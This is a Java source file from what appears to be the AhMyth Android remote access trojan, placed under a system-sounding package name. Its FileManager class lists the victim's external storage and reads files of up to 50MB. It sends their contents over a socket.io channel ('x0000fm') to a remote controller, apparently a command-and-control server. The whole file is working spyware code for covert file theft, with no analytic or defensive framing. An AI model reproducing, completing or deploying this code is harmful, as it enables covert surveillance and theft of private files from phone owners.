package com.sys.service.manager;

import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;


/**
 * Created by AhMyth on 10/23/16.
 */

public class FileManager {


    public static JSONArray walk(String path){

        if (path == null || path.isEmpty()) {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                path = android.os.Environment.getExternalStorageDirectory().getPath();
            } else {
                path = "/sdcard/";
            }
        }

        // Read all files sorted into the values-array
        JSONArray values = new JSONArray();
        File dir = new File(path);
        
        if (!dir.canRead()) {
            Log.e("FileManager", "Cannot read directory: " + path);
            // On Android 11+ we need specific permission for some dirs
        }

        File[] list = dir.listFiles();
        try {
        if (list != null) {
            JSONObject parenttObj = new JSONObject();
            parenttObj.put("name", "../");
            parenttObj.put("isDir", true);
            parenttObj.put("path", dir.getParent());
            values.put(parenttObj);
            for (File file : list) {
                if (!file.getName().startsWith(".")) {
                        JSONObject fileObj = new JSONObject();
                        fileObj.put("name", file.getName());
                        fileObj.put("isDir", file.isDirectory());
                        fileObj.put("path", file.getAbsolutePath());
                        values.put(fileObj);

                }
            }
        }
        } catch (JSONException e) {
            e.printStackTrace();
        }


        return values;
    }

    public static void downloadFile(String path){
        if (path == null)
            return;

        File file = new File(path);

        if (file.exists()){
            // Limit file size to 50MB to prevent OutOfMemoryError
            long maxSize = 50 * 1024 * 1024; // 50MB
            if (file.length() > maxSize) {
                try {
                    JSONObject object = new JSONObject();
                    object.put("error", true);
                    object.put("message", "File too large (max 50MB): " + (file.length() / 1024 / 1024) + "MB");
                    IOSocket.getInstance().getIoSocket().emit("x0000fm", object);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                return;
            }

            int size = (int) file.length();
            byte[] data = new byte[size];
            try {
                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
                buf.read(data, 0, data.length);
                JSONObject object = new JSONObject();
                object.put("file",true);
                object.put("name",file.getName());
                object.put("buffer" , data);
                IOSocket.getInstance().getIoSocket().emit("x0000fm" , object);
                buf.close();
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }


        }
    }

}
